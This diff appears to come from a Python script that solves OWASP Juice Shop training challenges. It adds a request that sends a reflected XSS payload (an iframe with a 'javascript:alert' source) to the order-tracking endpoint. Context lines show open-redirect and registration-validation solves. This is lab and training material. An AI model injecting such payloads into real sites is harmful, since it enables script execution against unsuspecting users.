@@ -15,6 +15,8 @@ requests.get(url+'/assets/public/images/uploads/😼-%23zatschi-%23whoneedsfourl
 requests.get(url+'/redirect?to=https://blockchain.info/address/1AbKfgvw9psQ41NbLi8kufDQTezwG8DRZm')
 # ---- Privacy Policy (Read our privacy policy.)
 requests.get(url+'/assets/public/images/padding/81px.png')
+# ---- Reflected XSS (Perform a reflected XSS attack with <iframe src="javascript:alert(`xss`)">.)
+requests.get(url+'/rest/track-order/<iframe src="javascript:alert(`xss`)">')
 # ---- Repetitive Registration (Follow the DRY principle while registering a user.)
 requests.post(url+'/api/Users/',data={'email':"aaaaaaa@juice-sh.op","password":"aaaaaaa","passwordRepeat":"aaaaaa","securityQuestion":{"id":6,"question":"Paternal grandmother's first name?","createdAt":"2020-01-16T14:58:58.420Z","updatedAt":"2020-01-16T14:58:58.420Z"},"securityAnswer":"aaaaaaa"})
 # ---- Score Board (Find the carefully hidden 'Score Board' page.)
